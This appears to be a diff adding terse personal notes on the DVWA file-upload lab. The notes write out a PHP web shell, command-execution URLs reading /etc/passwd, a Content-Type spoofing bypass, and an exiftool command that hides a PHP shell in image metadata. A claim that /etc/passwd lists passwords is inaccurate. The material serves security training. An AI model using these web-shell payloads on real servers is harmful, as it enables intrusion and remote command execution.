@@ -1,0 +1,18 @@
+File Upload
+
+Weevly tool used to exploit it with metaexploit n msfvenom(for payload creation)
+
+Low-  Didn’t check any file can upload shell.php .--> <?php echo system($_GET['command']); ?>
+
+Go to the url where file uloaded …/…/ hackable/uploads/shell.php  capture in burp.
+POST /dvwa/hackable/uploads/shell.php?command=whoami  laptop-******* \****** 
+command=hostname  LAPTOP-******* 
+command=ipconfig  192.168.1.10
+command=cat+/etc/passwd  get list passwords
+
+Medium- upload php file capture it in burp change.
+	Content-Type: image/jpeg
+
+High – can change file/image metadata using exiftool
+	cmd  exiftool -Comment='<?php echo "Hi " . system($_GET["command"]) . " Ninga"; ?>' image.jpeg -o copied_image.jpeg
+Then upload will be successful.
